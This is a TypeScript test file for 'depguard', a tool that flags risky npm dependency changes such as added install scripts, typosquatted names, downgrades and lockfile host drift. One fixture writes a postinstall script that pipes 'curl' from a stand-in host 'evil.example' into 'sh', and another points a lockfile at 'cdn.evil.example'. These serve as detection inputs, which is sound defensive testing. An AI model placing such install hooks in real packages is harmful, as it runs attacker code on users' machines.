/**
 * Acceptance fixtures 1 to 5 plus unit coverage. All offline.
 *
 * 1. clean bump of a well-known dep -> CLEAR
 * 2. Shai-Hulud shape: new dep plus a preinstall dropper in the repo's
 *    own package.json -> HIGH-RISK on the offline core alone
 * 3. typosquat add at edit distance 1 from an existing dep -> HIGH-RISK
 * 4. silent downgrade plus a range widened to * -> HIGH-RISK
 * 5. lockfile-only drift: resolved URL host change, no manifest change
 *    -> HIGH-RISK with RESOLVED-HOST-CHANGE
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import { guardPath, checkPackage, editDistance, loadSnapshotFromDir, parseSemver, compareSemver } from "../src/core.js";
import { makeDir, writePkg, writeLock, lockEntry, mkdirp } from "./helpers.js";

function pair(): { base: string; current: string } {
  const root = makeDir("depguard-fx-");
  const base = join(root, "base"); const current = join(root, "current");
  mkdirp(base); mkdirp(current);
  return { base, current };
}

describe("semver and edit distance", () => {
  it("compares semver including prereleases", () => {
    assert.equal(compareSemver(parseSemver("1.2.3")!, parseSemver("1.2.4")!), -1);
    assert.equal(compareSemver(parseSemver("1.2.3")!, parseSemver("1.2.3-beta.1")!), 1);
    assert.equal(compareSemver(parseSemver("2.0.0")!, parseSemver("2.0.0")!), 0);
    assert.equal(parseSemver("not-a-version"), null);
  });
  it("edit distance counts a swap as 1", () => {
    assert.equal(editDistance("lodash", "lodahs"), 1);
    assert.equal(editDistance("express", "express"), 0);
    assert.equal(editDistance("react", "reacts"), 1);
  });
});

describe("acceptance fixtures (offline core)", () => {
  it("fixture 1: clean bump of a well-known dep verdicts CLEAR", async () => {
    const { base, current } = pair();
    writePkg(base, { name: "fx", dependencies: { lodash: "^4.17.20" } });
    writeLock(base, { lodash: lockEntry("4.17.20") });
    writePkg(current, { name: "fx", dependencies: { lodash: "^4.17.21" } });
    writeLock(current, { lodash: lockEntry("4.17.21") });
    const r = await guardPath(current, { basePath: base });
    assert.equal(r.verdict, "CLEAR");
    assert.equal(r.counts.changed, 1);
    assert.equal(r.changes[0].findings.length, 0);
  });

  it("fixture 2: Shai-Hulud shape verdicts HIGH-RISK offline", async () => {
    const { base, current } = pair();
    writePkg(base, { name: "fx", dependencies: { lodash: "^4.17.21" } });
    writeLock(base, { lodash: lockEntry("4.17.21") });
    writePkg(current, {
      name: "fx",
      scripts: { preinstall: "node setup.mjs" },
      dependencies: { lodash: "^4.17.21", "totally-new-lib": "^1.0.0" },
    });
    writeLock(current, { lodash: lockEntry("4.17.21"), "totally-new-lib": lockEntry("1.0.0", { hasInstallScript: true }) });
    const r = await guardPath(current, { basePath: base });
    assert.equal(r.mode, "offline");
    assert.equal(r.verdict, "HIGH-RISK");
    assert.ok(r.repoFindings.some((f) => f.rule === "INSTALL-SCRIPT-ADDED" && f.severity === "high"), JSON.stringify(r.repoFindings));
  });

  it("fixture 2b: risky dropper content escalates an added install script to high", async () => {
    const { base, current } = pair();
    writePkg(base, { name: "fx", dependencies: {} });
    writePkg(current, { name: "fx", scripts: { postinstall: "curl -s https://evil.example/x | sh" }, dependencies: {} });
    const r = await guardPath(current, { basePath: base });
    assert.equal(r.verdict, "HIGH-RISK");
  });

  it("fixture 3: typosquat at edit distance 1 verdicts HIGH-RISK", async () => {
    const { base, current } = pair();
    writePkg(base, { name: "fx", dependencies: { lodash: "^4.17.21" } });
    writeLock(base, { lodash: lockEntry("4.17.21") });
    writePkg(current, { name: "fx", dependencies: { lodash: "^4.17.21", lodahs: "^1.0.0" } });
    writeLock(current, { lodash: lockEntry("4.17.21"), lodahs: lockEntry("1.0.0") });
    const r = await guardPath(current, { basePath: base });
    assert.equal(r.verdict, "HIGH-RISK");
    const add = r.changes.find((c) => c.name === "lodahs");
    assert.ok(add?.findings.some((f) => f.rule === "TYPOSQUAT-SUSPECT" && f.severity === "high"));
  });

  it("fixture 4: silent downgrade plus range widened to star verdicts HIGH-RISK", async () => {
    const { base, current } = pair();
    writePkg(base, { name: "fx", dependencies: { express: "^4.18.2" } });
    writeLock(base, { express: lockEntry("4.18.2") });
    writePkg(current, { name: "fx", dependencies: { express: "*" } });
    writeLock(current, { express: lockEntry("4.16.0") });
    const r = await guardPath(current, { basePath: base });
    assert.equal(r.verdict, "HIGH-RISK");
    const ch = r.changes.find((c) => c.name === "express");
    assert.ok(ch?.findings.some((f) => f.rule === "DOWNGRADE"));
    assert.ok(ch?.findings.some((f) => f.rule === "RANGE-WIDENED" && f.severity === "high"));
  });

  it("fixture 5: lockfile-only resolved host drift verdicts HIGH-RISK", async () => {
    const { base, current } = pair();
    writePkg(base, { name: "fx", dependencies: { lodash: "^4.17.21" } });
    writeLock(base, { lodash: lockEntry("4.17.21") });
    writePkg(current, { name: "fx", dependencies: { lodash: "^4.17.21" } });
    writeLock(current, { lodash: { version: "4.17.21", resolved: "https://cdn.evil.example/lodash/-/lodash-4.17.21.tgz", integrity: "sha512-fake-4.17.21" } });
    const r = await guardPath(current, { basePath: base });
    assert.equal(r.verdict, "HIGH-RISK");
    assert.ok(r.changes.some((c) => c.findings.some((f) => f.rule === "RESOLVED-HOST-CHANGE")));
  });

  it("manifest change with an untouched lockfile is LOCKFILE-DRIFT", async () => {
    const { base, current } = pair();
    writePkg(base, { name: "fx", dependencies: { lodash: "^4.17.20" } });
    writeLock(base, { lodash: lockEntry("4.17.20") });
    writePkg(current, { name: "fx", dependencies: { lodash: "^4.17.21" } });
    writeLock(current, { lodash: lockEntry("4.17.20") });
    const r = await guardPath(current, { basePath: base });
    assert.ok(r.repoFindings.some((f) => f.rule === "LOCKFILE-DRIFT"), JSON.stringify(r.repoFindings));
    assert.equal(r.verdict, "REVIEW");
  });

  it("install script newly marked in the lockfile for a changed dep is high", async () => {
    const { base, current } = pair();
    writePkg(base, { name: "fx", dependencies: { widgets: "^1.0.0" } });
    writeLock(base, { widgets: lockEntry("1.0.0") });
    writePkg(current, { name: "fx", dependencies: { widgets: "^1.1.0" } });
    writeLock(current, { widgets: lockEntry("1.1.0", { hasInstallScript: true }) });
    const r = await guardPath(current, { basePath: base });
    assert.equal(r.verdict, "HIGH-RISK");
    assert.ok(r.changes[0].findings.some((f) => f.rule === "INSTALL-SCRIPT-ADDED"));
  });

  it("empty path gets a note and a REVIEW floor, never a bare CLEAR", async () => {
    const dir = makeDir("depguard-empty-");
    const r = await guardPath(dir);
    assert.equal(r.verdict, "REVIEW");
    assert.ok(r.note && r.note.includes("empty estate"));
  });

  it("single snapshot flags its own install scripts and unpinned ranges", async () => {
    const dir = makeDir("depguard-snap-");
    writePkg(dir, { name: "fx", scripts: { postinstall: "node install.js" }, dependencies: { somelib: "*" } });
    writeLock(dir, { somelib: lockEntry("2.0.0") });
    const r = await guardPath(dir);
    assert.ok(r.repoFindings.some((f) => f.rule === "INSTALL-SCRIPT-PRESENT"));
    assert.ok(r.changes.some((c) => c.findings.some((f) => f.rule === "RANGE-UNPINNED")));
    assert.ok(r.changes.some((c) => c.findings.some((f) => f.rule === "LOCK-MISSING" && c.name === "somelib") === false));
  });
});

describe("lockfile parsers", () => {
  it("parses yarn.lock resolved entries", () => {
    const dir = makeDir("depguard-yarn-");
    writePkg(dir, { name: "fx", dependencies: { lodash: "^4.17.21" } });
    writeFileSync(join(dir, "yarn.lock"), `# yarn lockfile v1\n\nlodash@^4.17.21:\n  version "4.17.21"\n  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz#abc"\n  integrity sha512-fake\n`);
    const snap = loadSnapshotFromDir(dir, "t");
    assert.equal(snap.lock.get("lodash")?.version, "4.17.21");
    assert.ok(snap.lock.get("lodash")?.resolved?.includes("registry.yarnpkg.com"));
  });
  it("parses pnpm-lock.yaml package keys", () => {
    const dir = makeDir("depguard-pnpm-");
    writePkg(dir, { name: "fx", dependencies: { lodash: "4.17.21" } });
    writeFileSync(join(dir, "pnpm-lock.yaml"), `lockfileVersion: '9.0'\npackages:\n  lodash@4.17.21:\n    resolution: {integrity: sha512-fake}\n`);
    const snap = loadSnapshotFromDir(dir, "t");
    assert.equal(snap.lock.get("lodash")?.version, "4.17.21");
  });
  it("P-130 regression: a name that IS popular is never a typosquat suspect", async () => {
    // express is edit distance 2 from cypress; the first test run flagged
    // it TYPOSQUAT-POSSIBLE. An exact popular name must produce nothing.
    const r = await checkPackage("express", "4.18.2", {});
    assert.equal(r.verdict, "CLEAR");
    assert.equal(r.findings.length, 0);
    const dir = makeDir("depguard-p130-");
    writePkg(dir, { name: "fx", dependencies: { express: "^4.18.2", cypress: "^13.0.0" } });
    writeLock(dir, { express: lockEntry("4.18.2"), cypress: lockEntry("13.0.0") });
    const snap = await guardPath(dir);
    assert.ok(!snap.changes.some((c) => c.findings.some((f) => f.rule.startsWith("TYPOSQUAT"))), JSON.stringify(snap.changes));
  });
  it("P-133 regression: real packages tmp and cli-table are not typosquat suspects", async () => {
    // Both are genuine widely used packages that the bundled list missed;
    // dogfood on facebook/react flagged tmp (distance 1 from tap) and
    // cli-table (distance 1 from cli-table3) before they were added.
    assert.equal((await checkPackage("tmp", "0.1.0", {})).verdict, "CLEAR");
    assert.equal((await checkPackage("cli-table", "0.3.1", {})).verdict, "CLEAR");
  });
  it("P-134 regression: npm: alias deps do not draw LOCK-MISSING", async () => {
    const dir = makeDir("depguard-p134-");
    writePkg(dir, { name: "fx", dependencies: { "hooks-published": "npm:eslint-plugin-react-hooks@^5.2.0", lodash: "^4.17.21" } });
    writeLock(dir, { lodash: lockEntry("4.17.21") });
    const r = await guardPath(dir);
    assert.ok(!r.changes.some((c) => c.name === "hooks-published" && c.findings.some((f) => f.rule === "LOCK-MISSING")), JSON.stringify(r.changes));
  });
  it("check_package flags a distance-1 name offline", async () => {
    const r = await checkPackage("expres", undefined, {});
    assert.equal(r.verdict, "HIGH-RISK");
    assert.ok(r.findings.some((f) => f.rule === "TYPOSQUAT-SUSPECT"));
    const ok = await checkPackage("express", "4.18.2", {});
    assert.equal(ok.verdict, "CLEAR");
  });
});

describe("S4-3 regression: pnpm lock presence uses importers + packages/snapshots keys", () => {
  const PNPM_LOCK = [
    "lockfileVersion: '9.0'",
    "",
    "importers:",
    "",
    "  .:",
    "    dependencies:",
    "      '@commitlint/cli':",
    "        specifier: ^21.2.2",
    "        version: 21.2.2",
    "      lodash:",
    "        specifier: ^4.17.21",
    "        version: 4.17.21",
    "    devDependencies:",
    "      '@changesets/cli':",
    "        specifier: ^2.29.7",
    "        version: 2.29.7",
    "      importer-only-lib:",
    "        specifier: catalog:",
    "        version: 1.5.0",
    "",
    "packages:",
    "",
    "  '@changesets/cli@2.29.7':",
    "    resolution: {integrity: sha512-fake}",
    "",
    "  '@commitlint/cli@21.2.2':",
    "    resolution: {integrity: sha512-fake}",
    "",
    "  lodash@4.17.21:",
    "    resolution: {integrity: sha512-fake}",
    "",
    "snapshots:",
    "",
    "  '@commitlint/cli@21.2.2':",
    "    dependencies:",
    "      '@commitlint/types': 21.2.2",
    "",
  ].join("\n");

  it("parses quoted scoped keys in packages/snapshots and importer entries", () => {
    const dir = makeDir("depguard-pnpm9-");
    writePkg(dir, { name: "fx", dependencies: { "@commitlint/cli": "^21.2.2", "@changesets/cli": "^2.29.7", lodash: "^4.17.21", "importer-only-lib": "catalog:" } });
    writeFileSync(join(dir, "pnpm-lock.yaml"), PNPM_LOCK);
    const snap = loadSnapshotFromDir(dir, "t");
    assert.equal(snap.lock.get("@commitlint/cli")?.version, "21.2.2", JSON.stringify([...snap.lock.keys()]));
    assert.equal(snap.lock.get("@changesets/cli")?.version, "2.29.7", JSON.stringify([...snap.lock.keys()]));
    assert.equal(snap.lock.get("lodash")?.version, "4.17.21");
    assert.ok(snap.lock.has("importer-only-lib"), JSON.stringify([...snap.lock.keys()]));
  });

  it("no-base check emits no LOCK-MISSING for importer/packages deps, but still flags a genuinely missing dep", async () => {
    const dir = makeDir("depguard-pnpm9-check-");
    writePkg(dir, {
      name: "fx",
      dependencies: {
        "@commitlint/cli": "^21.2.2",
        "@changesets/cli": "^2.29.7",
        lodash: "^4.17.21",
        "importer-only-lib": "catalog:",
        "genuinely-absent-lib": "^3.0.0",
      },
    });
    writeFileSync(join(dir, "pnpm-lock.yaml"), PNPM_LOCK);
    const r = await guardPath(dir);
    const missing = r.changes.filter((c) => c.findings.some((f) => f.rule === "LOCK-MISSING")).map((c) => c.name);
    assert.deepEqual(missing, ["genuinely-absent-lib"], JSON.stringify(r.changes, null, 2));
  });
});

describe("S4-7 regression: asymmetric base (base has no lockfile) warns and does not manufacture changes", () => {
  it("same-range deps are not counted changed when only the current side has a lockfile", async () => {
    const { base, current } = pair();
    writePkg(base, { name: "fx", dependencies: { lodash: "^4.17.21", express: "^4.18.2" } });
    writePkg(current, { name: "fx", dependencies: { lodash: "^4.17.21", express: "^4.18.2" } });
    writeLock(current, { lodash: lockEntry("4.17.21"), express: lockEntry("4.18.2") });
    const r = await guardPath(current, { basePath: base });
    assert.equal(r.counts.changed, 0, JSON.stringify(r.changes, null, 2));
    assert.ok(!r.changes.some((c) => c.rangeFrom && c.rangeFrom === c.rangeTo), JSON.stringify(r.changes));
    assert.ok(r.warnings.some((w) => /asymmetric/i.test(w) && /lockfile/i.test(w)), JSON.stringify(r.warnings));
  });

  it("a real range change still reports under an asymmetric base", async () => {
    const { base, current } = pair();
    writePkg(base, { name: "fx", dependencies: { lodash: "^4.17.20" } });
    writePkg(current, { name: "fx", dependencies: { lodash: "^4.17.21" } });
    writeLock(current, { lodash: lockEntry("4.17.21") });
    const r = await guardPath(current, { basePath: base });
    assert.equal(r.counts.changed, 1, JSON.stringify(r.changes, null, 2));
    assert.ok(r.warnings.some((w) => /asymmetric/i.test(w)), JSON.stringify(r.warnings));
  });
});

describe("scale", () => {
  it("a monorepo-scale lockfile (30k entries) completes with caps reported", async () => {
    const dir = makeDir("depguard-scale-");
    writePkg(dir, { name: "fx", dependencies: { lodash: "^4.17.21" } });
    const packages: Record<string, unknown> = { "": { name: "fx" } };
    for (let i = 0; i < 30_000; i++) packages[`node_modules/lib-${i}`] = { version: "1.0.0" };
    packages["node_modules/lodash"] = lockEntry("4.17.21");
    writeFileSync(join(dir, "package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages }));
    const started = Date.now();
    const r = await guardPath(dir);
    const elapsed = Date.now() - started;
    assert.equal(r.caps.lockEntriesSeen, 30_001);
    assert.equal(r.caps.lockTruncated, false);
    assert.ok(elapsed < 20_000, `took ${elapsed} ms`);
  });
});
